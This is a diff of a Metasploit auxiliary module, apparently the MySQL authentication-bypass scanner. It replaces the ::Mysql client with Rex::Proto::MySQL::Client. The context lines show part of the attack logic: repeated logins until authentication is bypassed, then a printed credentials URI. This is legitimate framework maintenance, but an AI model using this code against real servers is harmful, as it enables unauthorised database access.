@@ -3,6 +3,8 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
+require 'rex/proto/mysql/client'
+
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::MYSQL
   include Msf::Auxiliary::Report
@@ -62,7 +64,7 @@ class MetasploitModule < Msf::Auxiliary
     begin
       socket = connect(false)
       close_required = true
-      mysql_client = ::Mysql.connect(rhost, username, password, nil, rport, io: socket)
+      mysql_client = ::Rex::Proto::MySQL::Client.connect(rhost, username, password, nil, rport, io: socket)
       results << mysql_client
       close_required = false
 
@@ -118,7 +120,7 @@ class MetasploitModule < Msf::Auxiliary
             # Create our socket and make the connection
             close_required = true
             s = connect(false)
-            mysql_client = ::Mysql.connect(rhost, username, password, nil, rport, io: s)
+            mysql_client = ::Rex::Proto::MySQL::Client.connect(rhost, username, password, nil, rport, io: s)
 
             print_good "#{rhost}:#{rport} Successfully bypassed authentication after #{count} attempts. URI: mysql://#{username}:#{password}@#{rhost}:#{rport}"
             results << mysql_client
